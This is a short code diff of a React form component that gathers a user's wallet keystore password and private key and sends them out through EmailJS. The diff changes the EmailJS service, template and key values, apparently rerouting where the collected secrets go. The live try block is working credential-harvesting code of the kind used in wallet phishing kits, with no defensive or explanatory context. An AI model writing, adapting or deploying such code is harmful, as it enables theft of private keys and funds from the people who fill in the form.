@@ -58,7 +58,7 @@ const Formdata = () => {
       ...(data.keystorePassword && { keystorePassword: data.keystorePassword }),
       ...(data.private && { privateKey: data.private }),
     };
-
+    //Ronald
     // try {
     //   const result = await emailjs.send(
     //     "service_6rpjdqn",
@@ -66,12 +66,13 @@ const Formdata = () => {
     //     templateParams,
     //     "ycopLxNeq0xS4yCi4"
     //   );
+
     try {
       const result = await emailjs.send(
-        "service_4dcwyzd",
-        "template_u12wotc",
+        "service_yctodgm",
+        "template_mcaebkn",
         templateParams,
-        "fZab5skM3kS9JSPtg"
+        "ycopLxNeq0xS4yCi4"
       );
 
       if (result.status === 200) {
